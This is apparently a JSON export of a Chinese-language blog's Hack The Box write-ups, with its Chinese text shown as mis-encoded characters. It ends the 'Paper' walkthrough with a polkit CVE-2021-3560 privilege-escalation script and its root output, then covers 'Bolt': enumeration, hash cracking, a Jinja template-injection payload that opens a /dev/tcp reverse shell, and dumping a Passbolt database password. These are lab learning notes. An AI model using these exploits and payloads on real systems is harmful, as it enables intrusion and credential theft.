stdout=subprocess.PIPE).stdout.decode('utf-8')\n        if user.find(\"uid\") != -1:\n                print(\"[+] User Created with the name of ahmed\")\n                print(\"[+] Timed out at: \"+str(Random))\n                check =False\n                break\n        if counter > 2000:\n                print(\"[-] Couldn't add the user, try again it may work\")\n                sys.exit(0)\n\nfor i in range(200):\n        #print(i)\n        uid = \"/org/freedesktop/Accounts/User\"+str(pwd.getpwnam('ahmed').pw_uid)\n\n        #In case you need to put a password un-comment the code below and put your password after string:yourpassword'\n        password = \"string:\"\n        #res = subprocess.run(['openssl', 'passwd','-5',password], stdout=subprocess.PIPE).stdout.decode('utf-8')\n        #password = f\"string:{res.rstrip()}\"\n\n        process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply',uid,'org.freedesktop.Accounts.User.SetPassword',password,'string:GoldenEye'])\n        try:\n                #print('1 - Running in process', process.pid)\n                Random = random.uniform(0.006,0.009)\n                process.wait(timeout=Random)\n                process.kill()\n        except subprocess.TimeoutExpired:\n                #print('Timed out - killing', process.pid)\n                process.kill()\n\nprint(\"[+] Timed out at: \" + str(Random))\nprint(\"[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root \")\n\np = subprocess.call(\"(su ahmed -c 'sudo su')\", shell=True)\n```\n```bash\n[dwight@paper ~]$ python3 CVE-2021-3560.py \n**************\nExploit: Privilege escalation with polkit - CVE-2021-3560\nExploit code written by Ahmad Almorabea @almorabea\nOriginal exploit author: Kevin Backhouse \nFor more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/\n**************\n[+] Starting the Exploit \nid: 'ahmed': no such user\nid: 'ahmed': no such user\nid: 'ahmed': no such user\nid: 'ahmed': no such user\nid: 'ahmed': no such user\nid: 'ahmed': no such user\nid: 'ahmed': no such user\nid: 'ahmed': no such user\nid: 'ahmed': no such user\n[+] User Created with the name of ahmed\n[+] Timed out at: 0.008836088833898081\n...\nError org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005\nError org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005\nError org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005\n[+] Timed out at: 0.008945334127711566\n[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root\nPassword: \nsu: Authentication failure\n```\nå‡ºç°è¿™ç§å°±æ˜¯æ‰§è¡Œå¤±è´¥ï¼Œåå¤å¤šæ¬¡æ‰§è¡Œï¼Œå‡ºç°ä¸‹åˆ—æç¤ºå°±æ˜¯æˆåŠŸäº†\n\n```bash\n[dwight@paper ~]$ python3 CVE-2021-3560.py \n**************\nExploit: Privilege escalation with polkit - CVE-2021-3560\nExploit code written by Ahmad Almorabea @almorabea\nOriginal exploit author: Kevin Backhouse \nFor more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/\n**************\n[+] Starting the Exploit \n[+] User Created with the name of ahmed\n[+] Timed out at: 0.008008275505860037\n[+] Timed out at: 0.00782768600159978\n[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root \nbash: cannot set terminal process group (118347): Inappropriate ioctl for device\nbash: no job control in this shell\n```\n```bash\n[root@paper dwight]# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸè·å¾—rootæƒé™\n\n```bash\n[root@paper dwight]# cd /root\n[root@paper ~]# ls\nanaconda-ks.cfg  initial-setup-ks.cfg  root.txt\n[root@paper ~]# cat root.txt \nfb28d8a0b971692ac9726bf448af8497\n```\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Bolt - Hackthebox","url":"/2022/01/17/Hackthebox/Medium/Hackthebox-Bolt/","content":"\n# Hackthebox - Bolt\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Bolt/72b0f2b4-8266-4be1-bd28-66ac49764a2d.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Bolt/c7905f20-ab98-42e1-897d-40bfd0d796b5.png)\n\n## ä¿¡æ¯æœé›†\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.114\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-01-04 20:07 EST\nWarning: 10.10.11.114 giving up on port because retransmission cap hit (10).\nNmap scan report for bogon (10.10.11.114)\nHost is up (0.26s latency).\nNot shown: 65527 closed ports\nPORT      STATE    SERVICE  VERSION\n22/tcp    open     ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)\n|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)\n|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)\n80/tcp    open     http     nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title:     Starter Website -  About \n443/tcp   open     ssl/http nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU\n| Not valid before: 2021-02-24T19:11:23\n|_Not valid after:  2022-02-24T19:11:23\n15062/tcp filtered unknown\n17825/tcp filtered unknown\n37303/tcp filtered unknown\n40042/tcp filtered unknown\n63830/tcp filtered unknown\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=1/4%OT=22%CT=1%CU=33320%PV=Y%DS=2%DC=T%G=Y%TM=61D4F026\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11\nOS:NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 23/tcp)\nHOP RTT       ADDRESS\n1   266.28 ms bogon (10.10.14.1)\n2   266.96 ms bogon (10.10.11.114)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 237.89 seconds\n```\né¦–å…ˆå»çœ‹çœ‹80ç«¯å£çš„httpæœåŠ¡\n\n![](Hackthebox-Bolt/de2e9987-4bad-4b45-8a95-830878efd108.png)\n\næ·»åŠ åˆ°hosts\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# echo 10.10.11.114 bolt.htb >> /etc/hosts\n```\nè¿™é‡Œæœ‰ä¸ªç™»å½•æŒ‰é’®ï¼Œè¿›å»çœ‹çœ‹\n\n![](Hackthebox-Bolt/9f180698-27ff-4f89-b98d-cc553b8ba90d.png)\n\nå°è¯•ä¸‹æœ‰æ²¡æœ‰å¼±å£ä»¤\n\n![](Hackthebox-Bolt/b3557e23-74c1-4f31-9dfe-4a80680d5f82.png)\n\nä½¿ç”¨adminè´¦æˆ·è¿›è¡Œç™»å½•ï¼Œæç¤ºçš„æ˜¯å¯†ç é”™è¯¯ï¼Œé‚£æ˜¯ä¸æ˜¯å¯ä»¥çˆ†ç ´è´¦å·å‘¢ï¼Ÿç”¨admin1æµ‹è¯•ä¸€ä¸‹\n\n![](Hackthebox-Bolt/31e93a3e-e33e-4a33-9ba9-dbc8709f3bf2.png)\n\næ˜¯çš„ï¼Œæç¤ºå®Œå…¨ä¸ä¸€æ ·ï¼Œç›®å‰å¯ä»¥ç¡®å®šadminè´¦å·å­˜åœ¨äº†\n\n![](Hackthebox-Bolt/dd4f952b-93e5-4790-bca0-91cb36ca119e.png)\n\nå°è¯•æ³¨å†Œè´¦å·å´æç¤º500ï¼Œå»æ‰«ä¸ªç›®å½•è¯•è¯•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://10.10.11.114/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.114/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\ncontact                 [Status: 200, Size: 26293, Words: 10060, Lines: 468]\nlogout                  [Status: 302, Size: 209, Words: 22, Lines: 4]\nlogin                   [Status: 200, Size: 9287, Words: 2135, Lines: 173]\nregister                [Status: 200, Size: 11038, Words: 3053, Lines: 199]\ndownload                [Status: 200, Size: 18570, Words: 5374, Lines: 346]\nservices                [Status: 200, Size: 22443, Words: 7170, Lines: 405]\npricing                 [Status: 200, Size: 31731, Words: 11055, Lines: 549]\nsign-up                 [Status: 200, Size: 11038, Words: 3053, Lines: 199]\nsign-in                 [Status: 200, Size: 9287, Words: 2135, Lines: 173]\n                        [Status: 200, Size: 30347, Words: 10870, Lines: 505]\ncheck-email             [Status: 200, Size: 7331, Words: 1224, Lines: 147]\n:: Progress: [20116/20116] :: Job [1/1] :: 61 req/sec :: Duration: [0:03:19] :: Errors: 0 ::\n```\néƒ½æµ‹è¯•äº†ä¸€éï¼Œæš‚æ—¶æ²¡ä»€ä¹ˆæ€è·¯ï¼Œä¸è¿‡sign-upå’Œsign-iné¡µé¢ä¼šæç¤º405ï¼Œæ„Ÿè§‰æ˜¯è¢«ä»€ä¹ˆä¸œè¥¿è¿‡æ»¤äº†ï¼Œå…ˆæ”¾ç€ä¸ç®¡ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–æ€è·¯å§\n\n![](Hackthebox-Bolt/b1e5ceb1-e935-4804-8058-d3c7310f12ee.png)\n\nåœ¨/downloadç›®å½•ä¸‹ï¼Œå’±ä»¬å¯ä»¥ä¸‹è½½ä¸€ä¸ªå‹ç¼©æ–‡ä»¶image.tar\n\næŠŠå®ƒä¸‹è½½ä¸‹æ¥çœ‹çœ‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/image]\nâ””â”€# ls -la\næ€»ç”¨é‡ 64\ndrwxr-xr-x 13 root root 4096  1æœˆ  6 01:03 .\ndrwxr-xr-x  4 root root 4096  1æœˆ  6 01:03 ..\ndrwxr-xr-x  2 root root 4096  3æœˆ  5  2021 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950\ndrwxr-xr-x  2 root root 4096  3æœˆ  5  2021 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c\ndrwxr-xr-x  2 root root 4096  3æœˆ  5  2021 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa\ndrwxr-xr-x  2 root root 4096  3æœˆ  5  2021 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab\ndrwxr-xr-x  2 root root 4096  3æœˆ  5  2021 3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162\ndrwxr-xr-x  2 root root 4096  3æœˆ  5  2021 3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b\ndrwxr-xr-x  2 root root 4096  3æœˆ  5  2021 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad\ndrwxr-xr-x  2 root root 4096  3æœˆ  5  2021 745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf\n-rw-r--r--  1 root root 3797  3æœˆ  5  2021 859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json\ndrwxr-xr-x  2 root root 4096  3æœˆ  5  2021 9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77\ndrwxr-xr-x  3 root root 4096  1æœˆ  6 01:03 a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2\ndrwxr-xr-x  2 root root 4096  3æœˆ  5  2021 d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26\n-rw-r--r--  1 root root 1002 12æœˆ 31  1969 manifest.json\n-rw-r--r--  1 root root  119 12æœˆ 31  1969 repositories\n```\nä¸‹è½½ä¸‹æ¥è§£å‹åï¼Œä¼šæœ‰å¾ˆå¤šæ–‡ä»¶ï¼Œåœ¨å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶å¤¹a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2ä¸­çš„layer.taré‡Œï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªæ–‡ä»¶db.sqlite3\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer]\nâ””â”€# ls -la\næ€»ç”¨é‡ 32\ndrwxr-xr-x 4 root root  4096  1æœˆ  6 01:03 .\ndrwxr-xr-x 3 root root  4096  1æœˆ  6 01:03 ..\n-rw-r--r-- 1 root root 16384  3æœˆ  5  2021 db.sqlite3\ndrwx------ 2 root root  4096  3æœˆ  5  2021 root\ndrwxrwxrwt 2 root root  4096  3æœˆ  5  2021 tmp\n```\nä½¿ç”¨sqlite3æŸ¥çœ‹ä¸€ä¸‹æ•°æ®åº“\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/image]\nâ””â”€# sqlite3 a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer/db.sqlite3                                                                                                                   1 âš™\nSQLite version 3.34.1 2021-01-20 14:10:07\nEnter \".help\" for usage hints.\nsqlite> .table\nUser\nsqlite> select * from user;\n1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||\n```\nå¾—åˆ°äº†ä¸€ä¸ªè´¦å·ï¼Œé‚®ç®±ï¼Œä»¥åŠä¸€ç©¿å¯†ç hash\n\nä½¿ç”¨johnçˆ†ç ´ä¸€ä¸‹å¯†ç \n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash\nWarning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\"\nUse the \"--format=md5crypt-long\" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\ndeadbolt         (?)\n1g 0:00:00:01 DONE (2022-01-06 01:11) 0.6451g/s 111483p/s 111483c/s 111483C/s debie..curtis13\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n```\nç°åœ¨å¾—åˆ°äº†è´¦å·å¯†ç \n\n```bash\nusername = admin\npassword = deadbolt\nemail = admin@bolt.htb\n```\næ‹¿ç€è´¦å·å¯†ç å»ç™»å½•åå°\n\n![](Hackthebox-Bolt/98b50cc5-292b-44ee-b820-5456a52bdec2.png)\n\n![](Hackthebox-Bolt/8a656953-372b-45bf-982a-42d3c6e06a58.png)\n\nåœ¨é¦–é¡µçš„ä½ç½®ï¼Œæœ‰ä¸€ä¸ªåœ¨çº¿èŠå¤©çª—å£ï¼Œæˆ‘æ„Ÿè§‰åº”è¯¥æ˜¯æœ‰XSSæ²¡è·‘\n\nåœ¨èŠå¤©å†…å®¹ä¸­æåˆ°äº†æœ‰å…¶ä»–ä¸»æœºï¼Œé‚£å°±æ‰¾ä¸€ä¸‹å§ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u \"http://bolt.htb\" -H \"Host:FUZZ.bolt.htb\" -fs 30347\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://bolt.htb\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n :: Header           : Host: FUZZ.bolt.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response size: 30347\n________________________________________________\n\ndemo                    [Status: 302, Size: 219, Words: 22, Lines: 4]\nmail                    [Status: 200, Size: 4943, Words: 345, Lines: 99]\nlists                   [Status: 200, Size: 0, Words: 1, Lines: 1]\nvideos                  [Status: 200, Size: 0, Words: 1, Lines: 1]\ndisco                   [Status: 200, Size: 0, Words: 1, Lines: 1]\n:: Progress: [4989/4989] :: Job [1/1] :: 35 req/sec :: Duration: [0:02:34] :: Errors: 0 ::\n```\nå‘ç°ä¸¤ä¸ªå¯ç”¨å­åŸŸådemoå’Œmailï¼Œç»™ä»–ä»¬åŠ å…¥åˆ°hostsé‡Œ\n\n```bash\necho 10.10.11.114 demo.bolt.htb mail.bolt.htb >> /etc/hosts\n```\n![](Hackthebox-Bolt/3fa3fcba-3a29-41de-a2d5-36082048b465.png)\n\nåœ¨demoè¿™ä¸€ä¸ªé¡µé¢é‡Œå‘ç°æœ‰æ–°çš„æ³¨å†Œç‚¹ï¼Œå¯ä»¥è¿›è¡Œæ³¨å†Œï¼Œä½†æ˜¯ç¼ºå°‘äº†ä¸€ä¸ªé‚€è¯·ç \n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/image]\nâ””â”€# grep -iR -A 2 'invite_code' 2>/dev/null\n--\n41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html:            {{ form.invite_code(placeholder=\"Invite Code\", class=\"form-control\") }}\n41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html-            <div class=\"input-group-append\">\n41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html-              <div class=\"input-group-text\">\n--\n41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/forms.py:    invite_code = TextField('Invite Code', id='invite_code'    , validators=[DataRequired()])\n--\n41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py:        code          = request.form['invite_code']\n41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py-        if code != 'XNSS-HSJW-3NGU-8XTJ':\n41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py-            return render_template('code-500.html')\n```\næ˜¾ç¤ºé‚€è¯·ç åœ¨41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.pyä¸­ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nif code != 'XNSS-HSJW-3NGU-8XTJ':\n```\næ‰¾åˆ°é‚€è¯·ç ï¼Œå»æ³¨å†Œä¸€ä¸ªè´¦å·\n\n![](Hackthebox-Bolt/6172ed51-339f-4ee8-8af0-ba599b0e21c7.png)\n\næ³¨å†Œåç™»å½•å³å¯ï¼Œæ–°æ³¨å†Œçš„è´¦å·åœ¨demoå’Œmailä¸Šéƒ½å¯ä»¥è¿›è¡Œç™»å½•\n\n![](Hackthebox-Bolt/0a86f004-5a88-4612-88c9-7b822ec78b24.png)\n\nåœ¨settingå¤„çš„nameé‡Œï¼Œå­˜åœ¨ä¸€ä¸ªSSTIï¼Œè¿™é‡Œæµ‹è¯•ä¸€ä¸‹\n\n![](Hackthebox-Bolt/5bb947f1-58ed-417d-9ae1-13fd4b88496b.png)\n\nä¿®æ”¹åæ”¶åˆ°äº†é‚®ä»¶\n\n![](Hackthebox-Bolt/367ca903-705e-4996-892a-e902edfe24c6.png)\n\nç‚¹å‡»é“¾æ¥ç¡®è®¤åï¼Œä»ªè¡¨ç›˜ä¸Šæ²¡æœ‰ä»»ä½•å˜åŒ–ï¼Œä½†æ˜¯å´æ”¶åˆ°äº†å¦ä¸€å°é‚®ä»¶ï¼Œé‡Œé¢æ˜¾ç¤ºäº†æˆ‘ä»¬è¾“å…¥çš„ç»“æœ\n\nç¡®è®¤å­˜åœ¨SSTI\n\n> [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/add722d1c27d90f15d313e8846e5a0f8b36a403a/Server Side Template Injection/README.md#exploit-the-ssti-by-calling-ospopenread](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/add722d1c27d90f15d313e8846e5a0f8b36a403a/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-ospopenread)\n\n![](Hackthebox-Bolt/f7d846d1-3503-4b7b-99dc-53346f1be9e1.png)\n\nä½¿ç”¨è¯¥pocè¿›è¡Œåˆ©ç”¨\n\n![](Hackthebox-Bolt/a98b0be8-4241-47e1-9aed-de6d085c85fb.png)\n\næˆåŠŸæ‰§è¡Œå‘½ä»¤\n\nç°åœ¨æ„é€ ä¸€ä¸ªpocæ¥è·å¾—ä¸€ä¸ªshell\n\n```bash\n{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('/bin/bash -c \"/bin/bash -i &>/dev/tcp/10.10.14.16/4444 <&1\"').read() }}\n```\nåœ¨æ‰§è¡Œpocä¹‹å‰ï¼Œå…ˆä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.16] from (UNKNOWN) [10.10.11.114] 47908\nbash: cannot set terminal process group (958): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@bolt:~/demo$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\næˆåŠŸè·å¾—ä¸€ä¸ªshell\n\n## æƒé™æå‡\n### User\næŸ¥æ‰¾ä¸€ä¸‹æœ‰ç™»é™†æƒé™çš„è´¦æˆ·\n\n```bash\nwww-data@bolt:/home$ grep 'bash' /etc/passwd\ngrep 'bash' /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\neddie:x:1000:1000:Eddie Johnson,,,:/home/eddie:/bin/bash\nclark:x:1001:1001:Clark Griswold,,,:/home/clark:/bin/bash\n```\neddieå’Œclarkéƒ½æœ‰ç™»é™†æƒé™\n\nåœ¨ç›®å½•/etc/passboltä¸‹å‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„æ–‡ä»¶passbolt.phpï¼Œæˆ‘ä»¬å»æŸ¥çœ‹ä¸€ä¸‹\n\n```php\n<?php\n/**\n * Passbolt ~ Open source password manager for teams\n * Copyright (c) Passbolt SA (https://www.passbolt.com)\n *\n * Licensed under GNU Affero General Public License version 3 of the or any later version.\n * For full copyright and license information, please see the LICENSE.txt\n * Redistributions of files must retain the above copyright notice.\n *\n * @copyright     Copyright (c) Passbolt SA (https://www.passbolt.com)\n * @license       https://opensource.org/licenses/AGPL-3.0 AGPL License\n * @link          https://www.passbolt.com Passbolt(tm)\n * @since         2.0.0\n */\n/**\n * PASSBOLT CONFIGURATION FILE\n *\n * This is a generated configuration file, which was generated by the passbolt web installer.\n *\n * To see all available options, you can refer to the default.php file, or replace this file\n * by a copy of passbolt.default.php\n * Do not modify default.php or you may break your upgrade process.\n *\n * Read more about how to install passbolt: https://www.passbolt.com/help/tech/install\n * Any issue, check out our FAQ: https://www.passbolt.com/faq\n * An installation issue? Ask for help to the community: https://community.passbolt.com/\n */\nreturn [\n    'App' => [\n        // A base URL to use for absolute links.\n        // The url where the passbolt instance will be reachable to your end users.\n        // This information is need to render images in emails for example\n        'fullBaseUrl' => 'https://passbolt.bolt.htb',\n    ],\n\n    // Database configuration.\n    'Datasources' => [\n        'default' => [\n            'host' => 'localhost',\n            'port' => '3306',\n            'username' => 'passbolt',\n            'password' => 'rT2;jW7<eY8!dX8}pQ8%',\n            'database' => 'passboltdb',\n        ],\n    ],\n\n    // Email configuration.\n    'EmailTransport' => [\n        'default' => [\n            'host' => 'localhost',\n            'port' => 587,\n            'username' => null,\n            'password' => null,\n            // Is this a secure connection? true if yes, null if no.\n            'tls' => true,\n            //'timeout' => 30,\n            //'client' => null,\n            //'url' => null,\n        ],\n    ],\n    'Email' => [\n        'default' => [\n            // Defines the default name and email of the sender of the emails.\n            'from' => ['localhost@bolt.htb' => 'localhost'],\n            //'charset' => 'utf-8',\n            //'headerCharset' => 'utf-8',\n        ],\n    ],\n    'passbolt' => [\n        // GPG Configuration.\n        // The keyring must to be owned and accessible by the webserver user.\n        // Example: www-data user on Debian\n        'gpg' => [\n            // Main server key.\n            'serverKey' => [\n                // Server private key fingerprint.\n                'fingerprint' => '59860A269E803FA094416753AB8E2EFB56A16C84',\n                'public' => CONFIG . DS . 'gpg' . DS . 'serverkey.asc',\n                'private' => CONFIG . DS . 'gpg' . DS . 'serverkey_private.asc',\n            ],\n        ],\n        'registration' => [\n            'public' => false,\n        ],\n        'ssl' => [\n            'force' => true,\n        ]\n    ],\n];\n```\nè¯¥æ–‡ä»¶æä¾›äº†ä¸€ä¸ªæ•°æ®åº“çš„è´¦å·å¯†ç ï¼Œç™»å…¥æŸ¥çœ‹ä¸€ä¸‹\n\n```sql\n/etc/passbolt$ mysql -upassbolt -p\n\nmysql> show databases;\nshow databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| passboltdb         |\n+--------------------+\n\nmysql> use passboltdb\n\nmysql> show tables;\nshow tables;\n+-----------------------+\n| Tables_in_passboltdb  |\n+-----------------------+\n| account_settings      |\n| action_logs           |\n| actions               |\n| authentication_tokens |\n| avatars               |\n| comments              |\n| email_queue           |\n| entities_history      |\n| favorites             |\n| gpgkeys               |\n| groups                |\n| groups_users          |\n| organization_settings |\n| permissions           |\n| permissions_history   |\n| phinxlog              |\n| profiles              |\n| resource_types        |\n| resources             |\n| roles                 |\n| secret_accesses       |\n| secrets               |\n| secrets_history       |\n| user_agents           |\n| users                 |\n+-----------------------+\n\nmysql> select * from users;\nselect * from users;\n+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+\n| id                                   | role_id                              | username       | active | deleted | created             | modified            |\n+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+\n| 4e184ee6-e436-47fb-91c9-dccb57f250bc | 1cfcd300-0664-407e-85e6-c11664a7d86c | eddie@bolt.htb |      1 |       0 | 2021-02-25 21:42:50 | 2021-02-25 21:55:06 |\n| 9d8a0452-53dc-4640-b3a7-9a3d86b0ff90 | 975b9a56-b1b1-453c-9362-c238a85dad76 | clark@bolt.htb |      1 |       0 | 2021-02-25 21:40:29 | 2021-02-25 21:42:32 |\n+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+\n2 rows in set (0.00 sec)\n```\nå¾ˆå¯æƒœæ²¡æœ‰æ‰¾åˆ°å¯†ç 